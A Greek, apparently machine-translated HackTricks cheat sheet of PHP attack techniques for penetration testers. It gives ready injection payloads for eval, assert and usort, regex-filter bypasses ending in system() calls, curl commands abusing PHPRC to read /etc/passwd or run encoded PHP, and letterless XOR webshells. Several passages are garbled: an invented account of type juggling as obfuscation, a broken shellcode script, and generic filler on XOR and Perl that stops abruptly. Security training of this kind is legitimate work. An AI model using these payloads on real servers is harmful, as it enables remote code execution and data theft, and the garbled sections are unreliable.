# Κόλπα PHP

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για χάκινγκ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Κοινή τοποθεσία των cookies:

Αυτό ισχύει επίσης για τα cookies του phpMyAdmin.

Cookies:
```
PHPSESSID
phpMyAdmin
```
Τοποθεσίες:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Παράκαμψη συγκρίσεων στην PHP

### Χαλαρές συγκρίσεις/Τύπος Juggling ( == )

Εάν χρησιμοποιείται το `==` στην PHP, τότε υπάρχουν απρόσμενες περιπτώσεις όπου η σύγκριση δεν συμπεριφέρεται όπως αναμένεται. Αυτό συμβαίνει επειδή το "==" συγκρίνει μόνο τιμές που έχουν μετατραπεί στον ίδιο τύπο, εάν θέλετε επίσης να συγκρίνετε τον τύπο των δεδομένων που συγκρίνονται να είναι ο ίδιος, πρέπει να χρησιμοποιήσετε το `===`.

Πίνακες συγκρίσεων PHP: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` Ένα string που δεν ξεκινά με έναν αριθμό είναι ίσο με έναν αριθμό
* `"0xAAAA" == "43690" -> True` Συμβολοσειρές που αποτελούνται από αριθμούς σε δεκαδική ή εξαδικαδική μορφή μπορούν να συγκριθούν με άλλους αριθμούς/συμβολοσειρές και να έχουν ως αποτέλεσμα True εάν οι αριθμοί είναι οι ίδιοι (οι αριθμοί σε μια συμβολοσειρά ερμηνεύονται ως αριθμοί)
* `"0e3264578" == 0 --> True` Μια συμβολοσειρά που ξεκινά με "0e" και ακολουθείται από οτιδήποτε θα είναι ίση με 0
* `"0X3264578" == 0X --> True` Μια συμβολοσειρά που ξεκινά με "0" και ακολουθείται από οποιοδήποτε γράμμα (το Χ μπορεί να είναι οποιοδήποτε γράμμα) και ακολουθείται από οτιδήποτε θα είναι ίση με 0
* `"0e12334" == "0" --> True` Αυτό είναι πολύ ενδιαφέρον επειδή σε ορισμένες περιπτώσεις μπορείτε να ελέγξετε τη συμβολοσειρά εισόδου του "0" και κάποιο περιεχόμενο που κατακερματίζεται και συγκρίνεται με αυτό. Επομένως, εάν μπορείτε να παρέχετε μια τιμή που θα δημιουργήσει ένα κατακερματισμένο αρχίζοντας με "0e" και χωρίς κανένα γράμμα, μπορείτε να παρακάμψετε τη σύγκριση. Μπορείτε να βρείτε **ήδη κατακερματισμένες συμβολοσειρές** με αυτήν τη μορφή εδώ: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Οποιοδήποτε γράμμα σε μια συμβολοσειρά είναι ίσο με τον ακέραιο 0

Περισσότερες πληροφορίες στο [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

Ο **Τύπος Juggling** επηρεάζει επίσης την συνάρτηση `in_array()` από προεπιλογή (πρέπει να ορίσετε σε true το τρίτο όρισμα για να γίνει μια αυστηρή σύγκριση):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Εάν αυτή η συνάρτηση χρησιμοποιείται για **οποιονδήποτε έλεγχο ταυτότητας** (όπως έλεγχος κωδικού πρόσβασης) και ο χρήστης ελέγχει ένα μέρος της σύγκρισης, μπορεί να στείλει ένα κενό πίνακα αντί για μια συμβολοσειρά ως την τιμή του κωδικού πρόσβασης (`https://example.com/login.php/?username=admin&password[]=`) και να παρακάμψει αυτόν τον έλεγχο:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
Το ίδιο σφάλμα συμβαίνει και με την `strcasecmp()`.

### Αυστηρή μετατροπή τύπου

Ακόμα κι αν χρησιμοποιείται το `===`, μπορεί να υπάρχουν σφάλματα που καθιστούν τη σύγκριση ευάλωτη στην αυτόματη μετατροπή τύπου. Για παράδειγμα, αν η σύγκριση μετατρέπει τα δεδομένα σε διαφορετικό τύπο αντικειμένου πριν γίνει η σύγκριση:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

Το **`preg_match()`** μπορεί να χρησιμοποιηθεί για να **επικυρώσει την είσοδο του χρήστη** (ελέγχει αν υπάρχει οποιαδήποτε **λέξη/regex** από μια **μαύρη λίστα** στην **είσοδο του χρήστη** και αν δεν υπάρχει, ο κώδικας μπορεί να συνεχίσει την εκτέλεσή του).

#### Παράκαμψη νέας γραμμής

Ωστόσο, όταν ορίζετε την αρχή του regexp, το `preg_match()` **ελέγχει μόνο την πρώτη γραμμή της εισόδου του χρήστη**, οπότε αν καταφέρετε να **στείλετε** την είσοδο σε **πολλαπλές γραμμές**, μπορείτε να παρακάμψετε αυτόν τον έλεγχο. Παράδειγμα:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Για να παρακάμψετε αυτόν τον έλεγχο, μπορείτε να **αποστείλετε την τιμή με νέες γραμμές που έχουν κωδικοποιηθεί σε μορφή URL** (`%0A`) ή αν μπορείτε να αποστείλετε **δεδομένα JSON**, να τα αποστείλετε σε **πολλαπλές γραμμές**:
```php
{
"cmd": "cat /etc/passwd"
}
```
Βρείτε ένα παράδειγμα εδώ: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Παράκαμψη σφάλματος μήκους**

(Αυτή η παράκαμψη δοκιμάστηκε προφανώς σε PHP 5.2.5 και δεν μπόρεσα να την εκτελέσω σε PHP 7.3.15)\
Εάν μπορείτε να στείλετε στην `preg_match()` μια έγκυρη πολύ **μεγάλη είσοδο**, δεν θα μπορέσει να την επεξεργαστεί και θα μπορείτε να **παρακάμψετε** τον έλεγχο. Για παράδειγμα, εάν απαγορεύει ένα JSON, μπορείτε να στείλετε:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
Από: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

#### Παράκαμψη ReDoS

Κόλπο από: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)


<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Συνοπτικά, το πρόβλημα συμβαίνει επειδή οι συναρτήσεις `preg_*` στην PHP βασίζονται στην [βιβλιοθήκη PCRE](http://www.pcre.org/). Στο PCRE, ορισμένες κανονικές εκφράσεις ταιριάζονται χρησιμοποιώντας πολλές αναδρομικές κλήσεις, οι οποίες καταναλώνουν πολύ χώρο στο σωρό. Είναι δυνατόν να οριστεί ένα όριο για τον αριθμό των αναδρομών που επιτρέπονται, αλλά στην PHP αυτό το όριο [προεπιλέγεται σε 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), που είναι περισσότερο από αυτό που χωράει στο σωρό.

[Αυτό το νήμα του Stackoverflow](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) συνδέθηκε επίσης στην ανάρτηση όπου αναφέρεται περισσότερο αναλυτικά για αυτό το θέμα. Η εργασία μας ήταν τώρα σαφής:\
**Στείλτε μια είσοδο που θα κάνει το regex να κάνει 100.000+ αναδρομές, προκαλώντας SIGSEGV, καθιστώντας τη συνάρτηση `preg_match()` να επιστρέψει `false`, κάνοντας έτσι την εφαρμογή να πιστέψει ότι η είσοδός μας δεν είναι κακόβουλη, πετώντας την έκπληξη στο τέλος του φορτίου κάτι σαν `{system(<verybadcommand>)}` για να πάρουμε SSTI --> RCE --> σημαία :)**.

Λοιπόν, σε όρους κανονικής έκφρασης, δεν κάνουμε πραγματικά 100.000 "αναδρομές", αλλά αντίθετα μετράμε "βήματα αναδρομής", τα οποία όπως αναφέρεται στην [τεκμηρίωση της PHP](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) προεπιλέγονται σε 1.000.000 (1M) στη μεταβλητή `pcre.backtrack_limit`.\
Για να φτάσουμε εκεί, `'X'*500_001` θα οδηγήσει σε 1 εκατομμύριο βήματα αναδρομής (500 χιλιάδες προς τα εμπρός και 500 χιλιάδες προς τα πίσω):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Τύπος Juggling για την απόκρυψη του PHP

Ο τύπος Juggling είναι μια τεχνική που χρησιμοποιείται για την απόκρυψη του κώδικα PHP με σκοπό την παραπλάνηση των επιθέσεων. Αυτή η τεχνική εκμεταλλεύεται την αδυναμία της PHP να διαχειριστεί σωστά τις συγκρίσεις μεταξύ διαφορετικών τύπων δεδομένων.

Ο τύπος Juggling συμβαίνει όταν η PHP επιχειρεί να συγκρίνει δύο μεταβλητές με διαφορετικούς τύπους δεδομένων. Αντί να εκτελεί μια αυστηρή σύγκριση, η PHP προσπαθεί να μετατρέψει τις μεταβλητές σε έναν κοινό τύπο δεδομένων και στη συνέχεια να τις συγκρίνει.

Για παράδειγμα, η PHP μπορεί να μετατρέψει μια αλφαριθμητική μεταβλητή σε ακέραιο αριθμό αν αυτή ξεκινά με αριθμό. Αυτή η συμπεριφορά μπορεί να εκμεταλλευτεί για να αποκρύψει τον πραγματικό κώδικα και να παραπλανήσει τους επιτιθέμενους.

Ο τύπος Juggling μπορεί να χρησιμοποιηθεί για την απόκρυψη ευαίσθητων πληροφοριών, όπως κωδικούς πρόσβασης ή δεδομένα χρηστών, καθώς και για τη δημιουργία παραπλανητικών μηνυμάτων λάθους.

Είναι σημαντικό να σημειωθεί ότι ο τύπος Juggling δεν παρέχει πραγματική ασφάλεια, αλλά μπορεί να παραπλανήσει τους επιτιθέμενους και να καθυστερήσει την ανίχνευση των ευπάθειών του κώδικα.
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Εκτέλεση Μετά την Ανακατεύθυνση (EAR)

Εάν το PHP ανακατευθύνει σε μια άλλη σελίδα αλλά δεν καλείται καμία συνάρτηση **`die`** ή **`exit`** μετά τον ορισμό του κεφαλίδας `Location`, το PHP συνεχίζει την εκτέλεση και προσθέτει τα δεδομένα στο σώμα της σελίδας:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Περισσότερα κόλπα

* **register\_globals**: Στο **PHP < 4.1.1.1** ή αν έχει γίνει λανθασμένη ρύθμιση, το **register\_globals** μπορεί να είναι ενεργό (ή η συμπεριφορά του να μιμείται). Αυτό σημαίνει ότι σε γενικές μεταβλητές όπως $\_GET, αν έχουν μια τιμή π.χ. $\_GET\["param"]="1234", μπορείτε να την αποκτήσετε μέσω της **$param**. Έτσι, αποστέλλοντας παραμέτρους HTTP, μπορείτε να αντικαταστήσετε μεταβλητές που χρησιμοποιούνται στον κώδικα.
* Τα **cookies PHPSESSION του ίδιου τομέα αποθηκεύονται στον ίδιο χώρο**, επομένως αν εντός ενός τομέα **χρησιμοποιούνται διαφορετικά cookies σε διάφορα μονοπάτια**, μπορείτε να κάνετε ένα μονοπάτι **να αποκτήσει πρόσβαση στο cookie του άλλου μονοπατιού** ορίζοντας την τιμή του cookie του άλλου μονοπατιού.\
Με αυτόν τον τρόπο, αν **και τα δύο μονοπάτια έχουν πρόσβαση σε μια μεταβλητή με το ίδιο όνομα**, μπορείτε να κάνετε τη **τιμή αυτής της μεταβλητής στο μονοπάτι1 να ισχύει για το μονοπάτι2**. Και έπειτα το μονοπάτι2 θα θεωρήσει έγκυρες τις μεταβλητές του μονοπατιού1 (δίνοντας στο cookie το όνομα που του αντιστοιχεί στο μονοπάτι2).
* Όταν έχετε τα **ονόματα χρηστών** των χρηστών της μηχανής, ελέγξτε τη διεύθυνση: **/\~\<USERNAME>** για να δείτε αν είναι ενεργοποιημένοι οι κατάλογοι php.
* [**LFI και RCE χρησιμοποιώντας php wrappers**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Αυτές οι συναρτήσεις χρησιμοποιούνται συνήθως στο PHP για να **δημιουργήσουν κατακερματισμούς από κωδικούς πρόσβασης** και να **ελέγξουν** αν ένας κωδικός πρόσβασης είναι σωστός σε σύγκριση με έναν κατακερματισμό.\
Οι υποστηριζόμενοι αλγόριθμοι είναι: `PASSWORD_DEFAULT` και `PASSWORD_BCRYPT` (ξεκινά με `$2y$`). Σημειώστε ότι **συχνά το PASSWORD\_DEFAULT είναι το ίδιο με το PASSWORD\_BCRYPT**. Και αυτήν τη στιγμή, το **PASSWORD\_BCRYPT** έχει μια **περιορισμένη χωρητικότητα στην είσοδο των 72bytes**. Επομένως, όταν προσπαθείτε να κατακερματίσετε κάτι μεγαλύτερο από 72bytes με αυτόν τον αλγόριθμο, θα χρησιμοποιηθούν μόνο τα πρώτα 72B:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### Παράκαμψη HTTP headers με κατάχρηση σφαλμάτων PHP

Εάν μια σελίδα **PHP εκτυπώνει σφάλματα και επιστρέφει κάποια είσοδο που παρέχεται από τον χρήστη**, ο χρήστης μπορεί να κάνει τον διακομιστή PHP να εκτυπώσει κάποιο **περιεχόμενο αρκετά μεγάλο**, έτσι ώστε όταν προσπαθεί να **προσθέσει τις κεφαλίδες** στην απόκριση, ο διακομιστής θα εμφανίσει ένα σφάλμα.\
Στο παρακάτω σενάριο, ο **επιτιθέμενος προκάλεσε τον διακομιστή να εμφανίσει μεγάλα σφάλματα**, και όπως μπορείτε να δείτε στην οθόνη, όταν το PHP προσπάθησε να **τροποποιήσει τις πληροφορίες της κεφαλίδας, δεν μπόρεσε** (για παράδειγμα, η κεφαλίδα CSP δεν απεστάλη στον χρήστη):

![](<../../../.gitbook/assets/image (465).png>)

## Εκτέλεση κώδικα

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Ελέγξτε αυτό για περισσότερες χρήσιμες συναρτήσεις PHP](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Για να εκτελεστεί ο κώδικας στο όρισμα "replace" απαιτείται τουλάχιστον μία αντιστοιχία.\
Αυτή η επιλογή της preg\_replace έχει **αποσυρθεί από την PHP 5.5.0.**

### **RCE μέσω της Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE μέσω Assert()**

Αυτή η συνάρτηση στην php σας επιτρέπει να **εκτελέσετε κώδικα που είναι γραμμένος σε μια συμβολοσειρά** για να **επιστρέψετε true ή false** (και ανάλογα με αυτό να αλλάξετε την εκτέλεση). Συνήθως η μεταβλητή χρήστη θα εισαχθεί στη μέση μιας συμβολοσειράς. Για παράδειγμα:\
`assert("strpos($_GET['page']),'..') === false")` --> Σε αυτήν την περίπτωση για να πάρετε **RCE** μπορείτε να κάνετε:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Θα χρειαστεί να **σπάσετε** τη **σύνταξη** του κώδικα, να **προσθέσετε** το **φορτίο** σας και στη συνέχεια να το **διορθώσετε ξανά**. Μπορείτε να χρησιμοποιήσετε **λογικές λειτουργίες** όπως "**and" ή "%26%26" ή "|"**. Σημειώστε ότι το "or", "||" δεν λειτουργεί επειδή αν η πρώτη συνθήκη είναι αληθής, το φορτίο μας δεν θα εκτελεστεί. Με τον ίδιο τρόπο, το ";" δεν λειτουργεί καθώς το φορτίο μας δεν θα εκτελεστεί.

**Άλλη επιλογή** είναι να προσθέσετε στο string την εκτέλεση της εντολής: `'.highlight_file('.passwd').'`

**Άλλη επιλογή** (αν έχετε τον εσωτερικό κώδικα) είναι να τροποποιήσετε μερικές μεταβλητές για να αλλοιώσετε την εκτέλεση: `$file = "hola"`

### **RCE μέσω usort()**

Αυτή η συνάρτηση χρησιμοποιείται για την ταξινόμηση ενός πίνακα στοιχείων χρησιμοποιώντας μια συγκεκριμένη συνάρτηση.\
Για να καταχραστείτε αυτήν τη συνάρτηση:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
Μπορείτε επίσης να χρησιμοποιήσετε **//** για να σχολιάσετε τον υπόλοιπο κώδικα.

Για να ανακαλύψετε τον αριθμό των παρενθέσεων που χρειάζεστε να κλείσετε:

* `?order=id;}//`: παίρνουμε ένα μήνυμα σφάλματος (`Parse error: syntax error, unexpected ';'`). Πιθανόν να λείπει μία ή περισσότερες αγκύλες.
* `?order=id);}//`: παίρνουμε ένα **προειδοποιητικό** μήνυμα. Φαίνεται να είναι σωστό.
* `?order=id));}//`: παίρνουμε ένα μήνυμα σφάλματος (`Parse error: syntax error, unexpected ')' i`). Πιθανόν να έχουμε πολλές κλείστρες.

### **RCE μέσω .httaccess**

Εάν μπορείτε να **ανεβάσετε** ένα **.htaccess**, τότε μπορείτε να **διαμορφώσετε** διάφορα πράγματα και ακόμα και να εκτελέσετε κώδικα (διαμορφώνοντας αυτά τα αρχεία με κατάληξη .htaccess μπορούν να **εκτελεστούν**).

Διάφορα .htaccess shells μπορούν να βρεθούν [εδώ](https://github.com/wireghoul/htshells)

### RCE μέσω μεταβλητών περιβάλλοντος

Εάν βρείτε μια ευπάθεια που σας επιτρέπει να **τροποποιήσετε μεταβλητές περιβάλλοντος στο PHP** (και μια άλλη για να ανεβάσετε αρχεία, αν και με περισσότερη έρευνα ίσως αυτό να μπορεί να παρακαμφθεί), μπορείτε να εκμεταλλευτείτε αυτήν τη συμπεριφορά για να πάρετε **RCE**.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Αυτή η μεταβλητή περιβάλλοντος σας επιτρέπει να φορτώσετε αυθαίρετες βιβλιοθήκες κατά την εκτέλεση άλλων δυαδικών αρχείων (αν και σε αυτήν την περίπτωση μπορεί να μην λειτουργήσει).
* **`PHPRC`** : Οδηγεί το PHP στο **πού να εντοπίσει το αρχείο ρυθμίσεών του**, συνήθως ονομαζόμενο `php.ini`. Εάν μπορείτε να ανεβάσετε το δικό σας αρχείο ρυθμίσεων, τότε χρησιμοποιήστε το `PHPRC` για να κατευθύνετε το PHP σε αυτό. Προσθέστε μια καταχώρηση **`auto_prepend_file`** που καθορίζει ένα δεύτερο ανεβασμένο αρχείο. Αυτό το δεύτερο αρχείο περιέχει κανονικό **κώδικα PHP, ο οποίος εκτελείται** από τον χρόνο εκτέλεσης του PHP πριν από οποιονδήποτε άλλο κώδικα.
1. Ανεβάστε ένα αρχείο PHP που περιέχει τον κώδικα του shell μας
2. Ανεβάστε ένα δεύτερο αρχείο που περιέχει μια οδηγία **`auto_prepend_file`** που εντολοδοτεί τον προεπεξεργαστή PHP να εκτελέσει το αρχείο που ανεβάσαμε στο βήμα 1
3. &#x20;Ορίστε τη μεταβλητή `PHPRC` στο αρχείο που ανεβάσαμε στο βήμα 2.
* Βρείτε περισσότερες πληροφορίες για το πώς να εκτελέσετε αυτήν την αλυσίδα [**από την αρχική αναφορά**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
* **PHPRC** - μια άλλη επιλογή
* Εάν **δεν μπορείτε να ανεβάσετε αρχεία**, μπορείτε να χρησιμοποιήσετε στο FreeBSD το "αρχείο" `/dev/fd/0` που περιέχει το **`stdin`**, δηλαδή το **σώμα** του αιτήματος που στάλθηκε στο `stdin`:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Ή για να πάρετε RCE, ενεργοποιήστε το **`allow_url_include`** και προσθέστε ένα αρχείο με **κώδικα PHP σε base64**:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* Τεχνική [**από αυτήν την αναφορά**](https://vulncheck.com/blog/juniper-cve-2023-36845).

## Στατική ανάλυση PHP

Ελέγξτε εάν μπορείτε να εισαγάγετε κώδικα σε κλήσεις αυτών των συναρτήσεων (από [εδώ](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Εάν αποσφαλματώνετε μια εφαρμογή PHP, μπορείτε να ενεργοποιήσετε την εκτύπωση σφαλμάτων παγκοσμίως στο `/etc/php5/apache2/php.ini`, προσθέτοντας `display_errors = On` και επανεκκινήστε το apache: `sudo systemctl restart apache2`

### Αποκωδικοποίηση κώδικα PHP

Μπορείτε να χρησιμοποιήσετε το **web**[ **www.unphp.net**](http://www.unphp.net) **για να αποκωδικοποιήσετε κώδικα php.**

## Πρωτόκολλα και Περιτυλίγματα PHP

Τα περιτυλίγματα και τα πρωτόκολλα PHP μπορούν να σας επιτρέψουν να **παρακάμψετε τις προστασίες εγγραφής και ανάγνωσης** σε ένα σύστημα και να το παραβιάσετε. Για [**περισσότερες πληροφορίες ανατρέξτε σε αυτήν τη σελίδα**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug unauthenticated RCE

Εάν δείτε ότι το **Xdebug** είναι **ενεργοποιημένο** στην έξοδο `phpconfig()`, πρέπει να προσπαθήσετε να λάβετε RCE μέσω [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Μεταβλητές μεταβλητές
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## Κατάχρηση RCE με το νέο $\_GET\["a"]\($\_GET\["b"])

Εάν σε μια σελίδα μπορείτε να **δημιουργήσετε ένα νέο αντικείμενο μιας αυθαίρετης κλάσης**, μπορείτε να καταφέρετε να αποκτήσετε RCE, ελέγξτε την παρακάτω σελίδα για να μάθετε πώς:

{% content-ref url="php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Εκτέλεση PHP χωρίς γράμματα

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Χρήση οκταδικού συστήματος
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

Το XOR (Αποκλειστικός Ή) είναι ένας λογικός τελεστής που χρησιμοποιείται συχνά στην κρυπτογραφία και στον υπολογιστικό τομέα. Ο τελεστής XOR εφαρμόζεται σε δύο δυαδικά bits και επιστρέφει έναν δυαδικό bit αποτέλεσμα. Η λογική πίνακας του XOR είναι η εξής:

| Είσοδος A | Είσοδος B | Αποτέλεσμα |
|-----------|-----------|-------------|
| 0         | 0         | 0           |
| 0         | 1         | 1           |
| 1         | 0         | 1           |
| 1         | 1         | 0           |

Στην κρυπτογραφία, το XOR χρησιμοποιείται για την κρυπτογράφηση και αποκρυπτογράφηση δεδομένων. Όταν δύο bits XOR-αρονται μεταξύ τους, το αποτέλεσμα είναι 1 αν τα bits είναι διαφορετικά και 0 αν είναι ίδια. Αυτή η ιδιότητα του XOR το καθιστά χρήσιμο για την παραγωγή κλειδιών κρυπτογράφησης και για την εφαρμογή αλγορίθμων κρυπτογράφησης, όπως το One-Time Pad.

Στον υπολογιστικό τομέα, το XOR χρησιμοποιείται για την εκτέλεση διαφόρων λειτουργιών, όπως η αντιστροφή bits, η ανίχνευση αλλαγών σε δεδομένα και η δημιουργία checksums.

Ο τελεστής XOR είναι επίσης χρήσιμος στον τομέα του hacking, καθώς μπορεί να χρησιμοποιηθεί για την εκτέλεση διαφόρων επιθέσεων, όπως η εύρεση κλειδιών κρυπτογράφησης, η ανίχνευση αλλαγών σε δεδομένα και η εκτέλεση επιθέσεων μεταξύ διαφορετικών διεργασιών.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### XOR εύκολος κώδικας κέλυφους

Σύμφωνα με [**αυτήν την ανάλυση**](https://mgp25.com/ctf/Web-challenge/), είναι δυνατόν να δημιουργηθεί ένας εύκολος κώδικας κέλυφους με την ακόλουθη μέθοδο:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Έτσι, αν μπορείτε να **εκτελέσετε αυθαίρετο PHP χωρίς αριθμούς και γράμματα**, μπορείτε να στείλετε ένα αίτημα όπως το παρακάτω καταχρώντας αυτό το φορτίο για να εκτελέσετε αυθαίρετο PHP:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Για μια πιο λεπτομερή εξήγηση, ανατρέξτε στο [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### XOR Shellcode (μέσα στο eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Παρόμοιο με την Perl

Η γλώσσα προγραμματισμού Perl είναι μια γλώσσα που χρησιμοποιείται ευρέως για την επεξεργασία κειμένου και την αυτοματοποίηση διαδικασιών. Στον κόσμο του hacking, η γλώσσα Perl μπορεί να χρησιμοποιηθεί για την ανάπτυξη εργαλείων και σεναρίων που βοηθούν στην εκτέλεση επιθέσεων και στην εκμετάλλευση ευπαθειών.

Οι παρακάτω τεχνικές και κόλπα μπορούν να χρησιμοποιηθούν στην Perl για την εκτέλεση επιθέσεων και την εξόρυξη πληροφοριών:

- **Εκτέλεση εντολών συστήματος**: Μπορείτε να χρησιμοποιήσετε την Perl για να εκτελέσετε εντολές συστήματος από το πρόγραμμά σας, προσφέροντας έτσι τη δυνατότητα να εκτελέσετε εντολές εντολικού περιβάλλοντος και να αποκτήσετε πρόσβαση σε λειτουργίες του συστήματος.

